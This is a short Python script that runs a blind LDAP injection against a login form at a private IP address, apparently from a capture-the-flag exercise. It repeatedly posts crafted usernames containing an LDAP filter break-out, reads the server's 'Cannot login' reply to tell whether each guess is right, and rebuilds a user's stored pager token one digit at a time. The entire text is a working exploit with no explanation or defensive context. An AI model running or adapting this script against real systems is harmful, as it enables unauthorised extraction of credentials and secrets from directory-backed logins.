import requests as r
import urllib.parse as u

token = ""
while( len(token)!=81 ):
    for i in range(0,10):

        ldap_injection = "ldapuser))(&(pager=%s%d*" % (token, i)
        data = { "inputUsername": u.quote(ldap_injection) }
        req = r.post("http://10.10.10.122/login.php", data=data)

        if "Cannot login" in req.text:
            token = token + str(i)
            print(token)
            break

print("[x] THE TOKEN IS " + token)